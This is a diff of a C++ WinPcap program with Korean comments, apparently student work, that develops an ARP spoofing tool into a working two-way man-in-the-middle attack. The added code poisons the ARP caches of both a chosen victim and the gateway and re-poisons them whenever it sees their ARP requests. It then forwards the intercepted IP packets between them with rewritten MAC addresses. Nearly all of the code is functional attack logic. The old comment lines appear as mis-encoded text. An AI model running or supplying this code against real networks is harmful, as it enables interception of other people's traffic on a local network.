@@ -5,18 +5,18 @@
 //short->uint_16
 //#pragma pack(push, 1)
 //#pragma pack(pop)... byte alignment
-//memcmpº¸´Ù uint32_t¸¦ ¾²´Â°Ô... ==¸¸À¸·Î °è»êÀÌ °¡´ÉÇÏµµ·Ï..ÇÕ½Ã´Ù.
-//or == ¿¬»êÀÚ overriding (mac, ip°¡ class°¡ µÈ´Ù. parsingÀÌ ¹Ù²ğµí)
-//¿ë¾î Á¤¸®
-//Attacker´Â Sender¿¡¼­ Receiver(target)À¸·Î °¡´Â ÆĞÅ¶À» º¸°í ½Í¾î spoofingÀ» ½ÃµµÇÑ´Ù. sender°¡ targetÀÌ´Ù.
-//arp table º¯Á¶ ½Ã°£ÀÌ Ç®¸®´Â ½ÃÁ¡Àº, cache expiration timeÀÌ ³¡³¯ ¶§´Ù. ÀÌ´Â sender (gateway)°¡ broadcast·Î "who has ~"ÆĞÅ¶À» º¸³¾ ¶§ÀÌ¹Ç·Î, ÀÌ ÆĞÅ¶À» È®ÀÎÇÏÀÚ¸¶ÀÚ º¸³»ÁÖ¸é µÈ´Ù.
-//while ¿ÀÁö°Ô ¶§¸®¸é ¾È´ë¿µ~
-//vista¿¡¼­´Â broadcast°¡ ¾Æ´Ï¶óunicast·Î º¸³½´Ù.
+//memcmpë³´ë‹¤ uint32_të¥¼ ì“°ëŠ”ê²Œ... ==ë§Œìœ¼ë¡œ ê³„ì‚°ì´ ê°€ëŠ¥í•˜ë„ë¡..í•©ì‹œë‹¤.
+//or == ì—°ì‚°ì overriding (mac, ipê°€ classê°€ ëœë‹¤. parsingì´ ë°”ë€”ë“¯)
+//ìš©ì–´ ì •ë¦¬
+//AttackerëŠ” Senderì—ì„œ Receiver(target)ìœ¼ë¡œ ê°€ëŠ” íŒ¨í‚·ì„ ë³´ê³  ì‹¶ì–´ spoofingì„ ì‹œë„í•œë‹¤. senderê°€ targetì´ë‹¤.
+//arp table ë³€ì¡° ì‹œê°„ì´ í’€ë¦¬ëŠ” ì‹œì ì€, cache expiration timeì´ ëë‚  ë•Œë‹¤. ì´ëŠ” sender (gateway)ê°€ broadcastë¡œ "who has ~"íŒ¨í‚·ì„ ë³´ë‚¼ ë•Œì´ë¯€ë¡œ, ì´ íŒ¨í‚·ì„ í™•ì¸í•˜ìë§ˆì ë³´ë‚´ì£¼ë©´ ëœë‹¤.
+//while ì˜¤ì§€ê²Œ ë•Œë¦¬ë©´ ì•ˆëŒ€ì˜~
+//vistaì—ì„œëŠ” broadcastê°€ ì•„ë‹ˆë¼unicastë¡œ ë³´ë‚¸ë‹¤.
 //arp_spoof wln0 10.2<sender> 10.1<target>
 
-//ÀÌÁß ¶ó¿ìÅÍ¿¡¼­´Â, ¶ó¿ìÅÍ A°¡ Á×°í ¶ó¿ìÅÍ B°¡ »ì¾Æ³ª¸é ¶ó¿ìÅÍ B´Â ARP redirect(°ÔÀÌÆ®¿şÀÌ°¡ ¹Ù²î¾úÀ½À» ¾Ë¸®´Â ÆĞÅ¶)À» broadcast·Î º¸³½´Ù.
+//ì´ì¤‘ ë¼ìš°í„°ì—ì„œëŠ”, ë¼ìš°í„° Aê°€ ì£½ê³  ë¼ìš°í„° Bê°€ ì‚´ì•„ë‚˜ë©´ ë¼ìš°í„° BëŠ” ARP redirect(ê²Œì´íŠ¸ì›¨ì´ê°€ ë°”ë€Œì—ˆìŒì„ ì•Œë¦¬ëŠ” íŒ¨í‚·)ì„ broadcastë¡œ ë³´ë‚¸ë‹¤.
 
-//switch jamming °ø°İ ÀÌÇØÇÏ±â -> dummy hub°¡ ¾ÈµÇ°í, ±×³É ³×Æ®¿öÅ©°¡ Á×´Â´Ù. ÀÌ°Åº¸´Ù arp spoofingÀÌ ´õ È¿À²ÀûÀÌ´Ù.
+//switch jamming ê³µê²© ì´í•´í•˜ê¸° -> dummy hubê°€ ì•ˆë˜ê³ , ê·¸ëƒ¥ ë„¤íŠ¸ì›Œí¬ê°€ ì£½ëŠ”ë‹¤. ì´ê±°ë³´ë‹¤ arp spoofingì´ ë” íš¨ìœ¨ì ì´ë‹¤.
 
 #include <iostream>
 #include <pcap.h>
@@ -24,6 +24,7 @@
 #include <tchar.h>
 #include <string.h>
 #include <ctype.h>
+#include <list>
 #include "getmymacip.h"
 
 //Ethernet Name
@@ -34,9 +35,10 @@
 #define ETHERTYPE 0x0001
 #define ETHERTYPE_IP 0x0800
 #define ETHERTYPE_ARP 0x0806
-#define ARP_LEN 42	//define´ë½Å static const
+#define ARP_LEN 42	//defineëŒ€ì‹  static const
 #define ARP_REPLY_TYPE 0
 
+#pragma pack(1)
 typedef struct ethernet_header {
 	uint8_t dest[MAC_LEN];
 	uint8_t sour[MAC_LEN];
@@ -60,7 +62,7 @@ typedef struct ipv4_header {
 	uint16_t ip_total_length;	//total ip length, no ethernet header
 	uint16_t ip_pid;	//packet id
 
-	uint8_t ip_frag_offset;	//fragmentedµÈ ÆĞÅ¶ÀÏ °æ¿ì, ÀÌ°Ô ¸î ¹øÂ°ÀÎÁö?
+	uint8_t ip_frag_offset;	//fragmentedëœ íŒ¨í‚·ì¼ ê²½ìš°, ì´ê²Œ ëª‡ ë²ˆì§¸ì¸ì§€?
 	uint8_t ip_ttl;	//time to live
 	uint8_t ip_protocol;	//ip protocol
 								//TCP 0x06, UDP 0x11
@@ -98,14 +100,29 @@ typedef struct MAC {
 		}
 	}
 }MAC;
+typedef struct session {
+	MAC sender_mac;
+	IP sender_ip;
+	MAC destination_mac;
+	IP destination_ip;
+}session;
 
-//targetÀº, ½ÇÁ¦·Î Å×ÀÌºí¿¡¼­ º¯Á¶ÇÏ°íÀÚ ÇÏ´Â ³»¿ë. (°ÔÀÌÆ®¿şÀÌip, ³»mac)
-MAC sender_mac;// { 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };	//°ø°İÀ» À§ÇØ¼­´Â °ø°İÀÚÀÇ macÁÖ¼Ò°¡ µé¾î°¡¾ßÇÔ. typeÀº reply
-IP sender_ip;// { 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//°ø°İÇÏ·Á¸é gateway ipÁÖ¼Ò°¡ µé¾î°¡¾ß ÇÔ.
-MAC destination_mac;// = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//Å×ÀÌºí º¯Á¶ ´ë»ó
-IP destination_ip;// = { 0, 0, 0, 0 };
+//targetì€, ì‹¤ì œë¡œ í…Œì´ë¸”ì—ì„œ ë³€ì¡°í•˜ê³ ì í•˜ëŠ” ë‚´ìš©. (ê²Œì´íŠ¸ì›¨ì´ip, ë‚´mac)
+/*
+MAC sender_mac;								//ê³µê²©ì„ ìœ„í•´ì„œëŠ” ê³µê²©ìì˜ macì£¼ì†Œê°€ ë“¤ì–´ê°€ì•¼í•¨. typeì€ reply
+IP sender_ip;								//ê³µê²©í•˜ë ¤ë©´ gateway ipì£¼ì†Œê°€ ë“¤ì–´ê°€ì•¼ í•¨.
+MAC destination_mac;						//í…Œì´ë¸” ë³€ì¡° ëŒ€ìƒ
+IP destination_ip;
+MAC sender_mac2;								//ê³µê²©ì„ ìœ„í•´ì„œëŠ” ê³µê²©ìì˜ macì£¼ì†Œê°€ ë“¤ì–´ê°€ì•¼í•¨. typeì€ reply
+IP sender_ip2;								//ê³µê²©í•˜ë ¤ë©´ gateway ipì£¼ì†Œê°€ ë“¤ì–´ê°€ì•¼ í•¨.
+MAC destination_mac2;						//í…Œì´ë¸” ë³€ì¡° ëŒ€ìƒ
+IP destination_ip2;
+*/
+
+session sess[2];
 MAC my_mac;
 IP my_ip;
+
 using namespace std;
 
 
@@ -135,8 +152,7 @@ void printPacket(uint8_t* packet, int packet_size) {
 	printf("%02x ", packet[i]);
 	}
 }
-int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
-	
+int sendARPrequest(pcap_t* fp, session* sess) {
 	int packet_idx = 0;
 	ETHER_HDR eth;
 	ARP_HDR arp;
@@ -146,9 +162,9 @@ int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
 	memset(&packet, 0, sizeof(packet));
 
 	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
-		eth.sour[i] = sender_mac.mac[i];
+		eth.sour[i] = sess->sender_mac.mac[i];
 		eth.dest[i] = 0xff;
-		arp.send_mac[i] = sender_mac.mac[i];	//target mac´Â gatewayÀÎÃ´ pretendingÇÏ´Â macÁÖ¼Ò·Î, attackerÀÇ macÀÌ´Ù.
+		arp.send_mac[i] = sess->sender_mac.mac[i];	//target macëŠ” gatewayì¸ì²™ pretendingí•˜ëŠ” macì£¼ì†Œë¡œ, attackerì˜ macì´ë‹¤.
 		arp.recv_mac[i] = 0x00;
 	}
 	eth.type = htons(ETHERTYPE_ARP);
@@ -158,12 +174,12 @@ int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
 
 	arp.type = htons(ETHERTYPE);			//ethernet type
 	arp.protocol_type = htons(ETHERTYPE_IP);
-	arp.hrdAddr = MAC_LEN;					//hardware size. ¿©±â¼­ hardware´Â macÁÖ¼Ò¸¦ ¾´´Ù.
-	arp.prtAddr = IPV4_LEN;					//protocol size. ¿©±â¼­ ipv4ÇÁ·ÎÅäÄİÀ» ¾²°í, ´ç¿¬È÷ ÁÖ¼Ò´Â ipÀÌ´Ù.
+	arp.hrdAddr = MAC_LEN;					//hardware size. ì—¬ê¸°ì„œ hardwareëŠ” macì£¼ì†Œë¥¼ ì“´ë‹¤.
+	arp.prtAddr = IPV4_LEN;					//protocol size. ì—¬ê¸°ì„œ ipv4í”„ë¡œí† ì½œì„ ì“°ê³ , ë‹¹ì—°íˆ ì£¼ì†ŒëŠ” ipì´ë‹¤.
 	arp.opcode = htons(0x0001);	//request
 	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
-		arp.send_ip[i] = sender_ip.ip[i];		//actual my ip, ´ëÃæ½áµµ µÈ´Ù´õ¶ó
-		arp.recv_ip[i] = destination_ip.ip[i];	//victim ip
+		arp.send_ip[i] = sess->sender_ip.ip[i];		//actual my ip, ëŒ€ì¶©ì¨ë„ ëœë‹¤ë”ë¼
+		arp.recv_ip[i] = sess->destination_ip.ip[i];	//victim ip
 	}
 
 	memcpy(packet + packet_idx, &arp, sizeof(arp));
@@ -176,9 +192,10 @@ int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
 	return 1;
 }
 //send arp packet and take mac of target
-int arp_getmac(pcap_t* fp, IP* target_ip, MAC* mac_container, IP* sender_ip) {
+//ì–´ì°¨í”¼ arp spoofingì„ í• ë•ŒëŠ” source macì€ í•­ìƒ mymacì´ë¯€ë¡œ, í•´ë‹¹ í•¨ìˆ˜ëŠ” destinationì˜ macì„ êµ¬í•˜ëŠ” ìš©ë„ë¡œ ì‚¬ìš©
+int arp_getmac(pcap_t* fp, session* sess) {
 
-	if (sendARPrequest(fp, target_ip, sender_ip) == -1)										//macÀ» µû±â À§ÇØ °ÅÁş ÆĞÅ¶À» ÇÏ³ª º¸³¿
+	if (sendARPrequest(fp, sess) == -1)										//macì„ ë”°ê¸° ìœ„í•´ ê±°ì§“ íŒ¨í‚·ì„ í•˜ë‚˜ ë³´ëƒ„
 		return -1;
 
 	struct pcap_pkthdr h;
@@ -189,18 +206,20 @@ int arp_getmac(pcap_t* fp, IP* target_ip, MAC* mac_container, IP* sender_ip) {
 			printf("ARP return isn't captured\n\n");
 			return -1;
 		}
-		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARPÆĞÅ¶ÀÎÁö È®ÀÎ
-			if (!memcmp((const char*)target_ip->ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31ÀÌ target ip¿Í °°ÀºÁö
-																								//printPacket((uint8_t*)temp, ARP_LEN);								//22 ~ 27 mac µû±â
-				memcpy((char*)mac_container->mac, (char*)temp + 22, MAC_LEN);
+
+		if (temp[12] == 0x08 && temp[13] == 0x06 && temp[20] == 0 && temp[21] == 2) {		//ARPíŒ¨í‚·ì¸ì§€, replyì¸ì§€ í™•ì¸
+			if (!memcmp((const char*)sess->destination_ip.ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31ì´ target ipì™€ ê°™ì€ì§€
+																								//printPacket((uint8_t*)temp, ARP_LEN);								//22 ~ 27 mac ë”°ê¸°
+				memcpy((char*)sess->destination_mac.mac, (char*)temp + 22, MAC_LEN);
 				printf("Mac address is captured\n");
 				break;
 			}
 		}
 		temp = pcap_next(fp, &h);
 	}
+	//printf("fail to capture packet\n");
 }
-int sendPacket(pcap_t* fp, int type) {
+int sendPacket(pcap_t* fp, int type, session* sess) {
 	ETHER_HDR eth;
 	uint8_t packet[1500];
 	int packet_idx = 0;
@@ -208,8 +227,8 @@ int sendPacket(pcap_t* fp, int type) {
 	memset(&packet, 0, sizeof(packet));
 
 	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
-		eth.sour[i] = sender_mac.mac[i];
-		eth.dest[i] = destination_mac.mac[i];
+		eth.sour[i] = sess->sender_mac.mac[i];
+		eth.dest[i] = sess->destination_mac.mac[i];
 	}
 
 	if (type == ARP_REPLY_TYPE) {							//when arp
@@ -221,16 +240,16 @@ int sendPacket(pcap_t* fp, int type) {
 		packet_idx += sizeof(eth);
 		arp.type = htons(ETHERTYPE);			//ethernet type
 		arp.protocol_type = htons(ETHERTYPE_IP);
-		arp.hrdAddr = MAC_LEN;					//hardware size. ¿©±â¼­ hardware´Â macÁÖ¼Ò¸¦ ¾´´Ù.
-		arp.prtAddr = IPV4_LEN;					//protocol size. ¿©±â¼­ ipv4ÇÁ·ÎÅäÄİÀ» ¾²°í, ´ç¿¬È÷ ÁÖ¼Ò´Â ipÀÌ´Ù.
+		arp.hrdAddr = MAC_LEN;					//hardware size. ì—¬ê¸°ì„œ hardwareëŠ” macì£¼ì†Œë¥¼ ì“´ë‹¤.
+		arp.prtAddr = IPV4_LEN;					//protocol size. ì—¬ê¸°ì„œ ipv4í”„ë¡œí† ì½œì„ ì“°ê³ , ë‹¹ì—°íˆ ì£¼ì†ŒëŠ” ipì´ë‹¤.
 		arp.opcode = htons(0x0002);	//attack, reply
 		for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
-			arp.send_ip[i] = sender_ip.ip[i];		//arp¿¡¼± source ip°¡ pretending ip(gateway)ÀÌ´Ù.
-			arp.recv_ip[i] = destination_ip.ip[i];	//victim ip
+			arp.send_ip[i] = sess->sender_ip.ip[i];		//arpì—ì„  source ipê°€ pretending ip(gateway)ì´ë‹¤.
+			arp.recv_ip[i] = sess->destination_ip.ip[i];	//victim ip
 		}
 		for (int i = 0; i < MAC_LEN; i++) {		//mac of arp header
-			arp.send_mac[i] = sender_mac.mac[i];
-			arp.recv_mac[i] = destination_mac.mac[i];
+			arp.send_mac[i] = sess->sender_mac.mac[i];
+			arp.recv_mac[i] = sess->destination_mac.mac[i];
 		}
 		memcpy(packet + packet_idx, &arp, sizeof(arp));
 		packet_idx += sizeof(arp);
@@ -248,7 +267,7 @@ int sendPacket(pcap_t* fp, int type) {
 int main(int argc, char* argv[]) {
 	pcap_if_t* alldevs;
 	pcap_t* fp;
-	//findalldevs Á¤º¸ https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
+	//findalldevs ì •ë³´ https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
 	int inum = -1;	int i = 0;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
@@ -256,7 +275,7 @@ int main(int argc, char* argv[]) {
 		exit(1);
 	}
 
-	//pcap_t ±¸Á¶Ã¼ Á¤º¸ https://blog.silnex.kr/libpcapstruct-pcap_t/
+	//pcap_t êµ¬ì¡°ì²´ ì •ë³´ https://blog.silnex.kr/libpcapstruct-pcap_t/
 	for (pcap_if_t* dev = alldevs; dev; dev = dev->next) {
 		printf("%d. %s", ++i, dev->name);
 		int idx;
@@ -286,9 +305,9 @@ int main(int argc, char* argv[]) {
 	i = 0;
 	pcap_if_t* dev = alldevs;
 	for ( ; i < inum - 1; dev = dev->next, i++);
-	//list ¼øÈ¸ÇÏ¿© ¼±ÅÃµÈ interface·Î ³Ñ¾î°¨.
+	//list ìˆœíšŒí•˜ì—¬ ì„ íƒëœ interfaceë¡œ ë„˜ì–´ê°.
 
-	//pcap_open_live, fp Á¤º¸ https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
+	//`live, fp ì •ë³´ https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
 	fp = pcap_open_live(dev->name, USHRT_MAX + 1, 0, 1000, errbuf);
 	//device name, capturing size, promiscuous mode, read timeout, error buffer
 	if (!fp) {
@@ -304,21 +323,138 @@ int main(int argc, char* argv[]) {
 	//name, destination_ip, target_ip
 	strncpy(interfaceName, argv[1], strlen(argv[1]));	//device name
 	interfaceName[strlen(argv[1])] = 0;
-	memcpy(ip, argv[2], strlen(argv[2]));				//192.168.43.?	(destination, ?ÀÌ ¹Ş°í ÀÖ´Ù, Å×ÀÌºí º¯Á¶ ´ë»ó)
-	ipParser(ip, &destination_ip);
+
+	memcpy(ip, argv[2], strlen(argv[2]));				//192.168.43.?	(destination, ?ì´ ë°›ê³  ìˆë‹¤, í…Œì´ë¸” ë³€ì¡° ëŒ€ìƒ)
+	ipParser(ip, &sess[0].destination_ip);
 	memset(ip, 0, sizeof(ip));
-	memcpy(ip, argv[3], strlen(argv[3]));				//192.168.43.1 (sender, 1ÀÌ º¸³»°í ÀÖ´Â Ã´)
-	ipParser(ip, &sender_ip);
+	
+	memcpy(ip, argv[3], strlen(argv[3]));				//192.168.43.1 (sender, 1ì´ ë³´ë‚´ê³  ìˆëŠ” ì²™)
+	ipParser(ip, &sess[0].sender_ip);
+	memset(ip, 0, sizeof(ip));
+	
+	memcpy(ip, argv[4], strlen(argv[4]));
+	ipParser(ip, &sess[1].destination_ip);
+	memset(ip, 0, sizeof(ip));
+	
+	memcpy(ip, argv[5], strlen(argv[5]));
+	ipParser(ip, &sess[1].sender_ip);
+	memset(ip, 0, sizeof(ip));
 
 	//get destination mac using ip 
-	macParser(getMyMac(interfaceName), &my_mac);		//³» mac Á÷Á¢ ±¸ÇÏ±â
-	ipParser(getMyIP(interfaceName), &my_ip);			//³» ipÁ÷Á¢ ±¸ÇÏ±â
-	sender_mac = my_mac;								//¿©±â¼­ sender_macÀº ³» °ÍÀ¸·Î º¯Á¶
+	macParser(getMyMac(interfaceName), &my_mac);		//ë‚´ mac ì§ì ‘ êµ¬í•˜ê¸°
+	ipParser(getMyIP(interfaceName), &my_ip);			//ë‚´ ipì§ì ‘ êµ¬í•˜ê¸°
+	sess[0].sender_mac = my_mac;								//ì—¬ê¸°ì„œ sender_macì€ ë‚´ ê²ƒìœ¼ë¡œ ë³€ì¡°
+	sess[1].sender_mac = my_mac;
 
-	if (arp_getmac(fp, &destination_ip, &destination_mac, &sender_ip) == -1)		//destination_mac ±¸ÇÏ±â
-		exit(0);																	//sender_ip, destination_ip´Â ÀÌ¹Ì ÁÖ¾îÁü. ¿©±â¼­ ¸ğµç °ª 
+	if (arp_getmac(fp, &sess[0]) == -1)		//destination_mac êµ¬í•˜ê¸°
+		exit(0);																	//sender_ip, destination_ipëŠ” ì´ë¯¸ ì£¼ì–´ì§. ì—¬ê¸°ì„œ ëª¨ë“  ê°’
+	if (arp_getmac(fp, &sess[1]) == -1)
+		exit(0);
 
-//Packet manupulation-------------------------------------------------------------------------------------------------------
-	
-	sendPacket(fp, ARP_REPLY_TYPE);
+//send corrupted arp--------------------------------------------------------------------------------------------------------
+	sendPacket(fp, ARP_REPLY_TYPE, &sess[0]);
+	sendPacket(fp, ARP_REPLY_TYPE, &sess[1]);
+//send corrupted arp--------------------------------------------------------------------------------------------------------
+
+	struct pcap_pkthdr* h;
+	u_char* next_packet;
+	pcap_next_ex(fp, &h, (const u_char**)&next_packet);
+	int count = 0;
+
+	while (++count) {										//íŒ¨í‚· ìº¡ì³í•˜ê¸°
+		
+		if (!next_packet) {
+			printf("\nNo packet\n");
+			exit(1);
+		}
+		
+		printPacket((uint8_t*)next_packet, 42);
+		
+		bool isARPrequest = !memcmp(next_packet + 12, "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01", 10);			//12~21ì´ "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01" ì¼ë•Œ, 01ì€ request
+		if (isARPrequest) {																				//ARP ìš”ì²­ íŒ¨í‚·ì´ë¼ë©´
+			printf("\nARP request packet is found\n");
+			for (int i = 0; i <= 1; i++) {																//gateway, victim ì–‘ë°©ë©´ í™•ì¸
+				bool f1, f2, f3, f4;
+				f1 = !memcmp(sess[i].destination_mac.mac, next_packet + 6, MAC_LEN);										//íŒ¨í‚·ì˜ 0~5ë²ˆì§¸ ì¸ë±ìŠ¤ê°€ gateway mac ì£¼ì†Œì™€ ê°™ê±°ë‚˜(ê³µê²©ì‹œì—” ê³µê²©ì ë§¥ì£¼ì†Œ)
+				f2 = !memcmp(sess[i].sender_mac.mac, "\xff\xff\xff\xff\xff\xff", MAC_LEN);						// or ffffffffffffì™€ ê°™ì„ ë•Œ
+				f3 = !memcmp(sess[i].sender_ip.ip, (uint8_t*)next_packet + 38, IPV4_LEN);						//39~42 gateway ipì£¼ì†Œ(real ip)
+				f4 = !memcmp(next_packet + 28, sess[i].destination_ip.ip, IPV4_LEN);							//victimì´ ë³´ë‚¸ íŒ¨í‚·ì¸ì§€? (victimì´ ë³´ë‚¸ íŒ¨í‚·)
+				if ((f1 || f2) && f3 && f4)															//victimì˜ gateway mac ìš”ì²­ì¸ì§€ í™•ì¸í•˜ê³ 
+					sendPacket(fp, ARP_REPLY_TYPE, &sess[i]);													//ë³€ì¡°íŒ¨í‚· ì „ì†¡
+			}
+		}
+		else if(next_packet[12] == 0x08 && next_packet[13] == 0x00 && next_packet[23] == 0x01){				//ip packetì„ì„ í™•ì¸																				//ì•„ë‹ˆë¼ë©´, victim-gateway í†µì‹ ì¸ì§€ í™•ì¸í•˜ê³  í¬ì›Œë”©
+			//packet forwarding
+			//victim-attacker send_mac ë‚´ê±° send_ip gatewayê±° destination_mac, ipëŠ” victimê±°
+			//gateway-attacker send_mac ë‚´ê±° send_ip victimê±° destination_mac, ipëŠ” gatewayê±°
+			//next_packet[12]==0x08, [13]==0x00ì¸ì§€ í™•ì¸í•˜ì—¬ ipíŒ¨í‚·ì¸ì§€ ë¨¼ì € í™•ì¸
+			//26~29ê°€ source(í…Œì´ë¸”ì„ ë³€ì¡°ì‹œí‚¨ victim ip, ì—¬ê¸°ì„  destination_ip.ip), 30~33ì´ destination(gateway ip, ì—¬ê¸°ì„  sender_ip.ip)
+			//victim->gateway, ipëŠ” victim->gatewayì§€ë§Œ macì€ victim->my_macì´ë‹¤. ë”°ë¼ì„œ macì„ my_mac->gatewayë¡œ ë°”ê¿”ì¤˜ì•¼í•œë‹¤.
+
+			//sess[0]ê°’ sender_ip 192.168.43.1 destination_ip 192.168.43.202
+			//sender_mac my_mac destination_mac victiom
+
+			//sess[1]ê°’ sender_ip 192.168.43.202 destination_ip 192.168.43.1
+			//sender_mac my_mac destination_mac gateway
+			u_char forwarding[1500];
+			memset(forwarding, 0, 1500);
+			//if (count > 50) {
+			//	next_packet = (u_char*)malloc(sizeof(char) * 1500);
+			//	memcpy(next_packet, "\xcc\x2f\x71\x59\x64\x74\xd0\xc6\x37\xd3\x10\x1c\x08\x00\x45\x00" \
+			//		"\x00\x3c\x26\xe2\x00\x00\x80\x01\x17\x5d\xc0\xa8\x2b\xca\x08\x08" \
+			//		"\x08\x08\x08\x00\x4c\x00\x00\x01\x01\x5b\x61\x62\x63\x64\x65\x66" \
+			//		"\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76" \
+			//		"\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69", 74);
+			//}
+			//victim->random. ipëŠ” victim(source, 26)->random(dest, 30)ì´ì§€ë§Œ victim_mac(src, 6)->my_mac(dest, 0)ì´ë‹¤.
+			//ë”°ë¼ì„œ my_mac->gateway_mac, my_ip->random_ipë¡œ ìˆ˜ì •.
+			//printf("\n\nicmp is captured\n\n");
+			//printPacket(next_packet, (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14);
+			//getchar();
+			if (!memcmp(next_packet + 26, sess[0].destination_ip.ip, IPV4_LEN)) {
+				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
+				memcpy(forwarding, next_packet, packet_len);
+				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
+				memcpy(forwarding, sess[1].destination_mac.mac, MAC_LEN);
+//				memcpy(forwarding + 26, my_ip.ip, IPV4_LEN);
+				pcap_sendpacket(fp, forwarding, packet_len);
+				printPacket(forwarding, packet_len);
+			}
+			//sess[0]ê°’ sender_ip 192.168.43.1 destination_ip 192.168.43.202
+			//sender_mac my_mac destination_mac victiom
+			//sess[1]ê°’ sender_ip 192.168.43.202 destination_ip 192.168.43.1
+			//sender_mac my_mac destination_mac gateway
+
+			//202, des[0]  1, des[1]
+			//random->victim. ipëŠ” random(src, 26)->my_ip(dest, 30)ì´ì§€ë§Œ macì€ gateway(src, 6)->my_mac(dest, 0)ì´ë‹¤.
+			//ë”°ë¼ì„œ my_mac(6)->victim_mac(0), random_ip(src, 26)->victim_ip(dest, 30)ìœ¼ë¡œ ìˆ˜ì •.
+			else if (!memcmp(next_packet + 30, sess[0].destination_ip.ip, IPV4_LEN)) {
+				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
+				memcpy(forwarding, next_packet, packet_len);
+				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
+				memcpy(forwarding, sess[0].destination_mac.mac, MAC_LEN);
+//				memcpy(forwarding + 30, sess[0].destination_ip.ip, IPV4_LEN);
+				pcap_sendpacket(fp, forwarding, packet_len);
+			}
+				/*
+				if this packet is from victim to gateway(source mac and ip is vimtim's / destination ip is gateway's / destination mac is mine)
+				{
+					change_value(source_mac -> my_mac)
+					change_value(destination_mac -> real gateway's mac)
+					int packet_len = recognizing_packet_type_and_get_length;
+					pcap_sendpacket(fp, next_packet, packet_len);
+				}
+				else if this packet is from gate to victim(source mac and ip is gateway's / destination ip is victim's / destination mac is mine)
+				{
+					change_value(source_mac -> my_mac)
+					change_value(destination_mac -> real victim's mac)
+					int packet_len = recognizing_packet_type_and_get_length;
+					pcap_sendpacket(fp, next_packet, packet_len);
+				}
+				*/
+
+		}
+		printf("\n%d\n", count);
+		pcap_next_ex(fp, &h, (const u_char**)&next_packet);		
+	}
 }
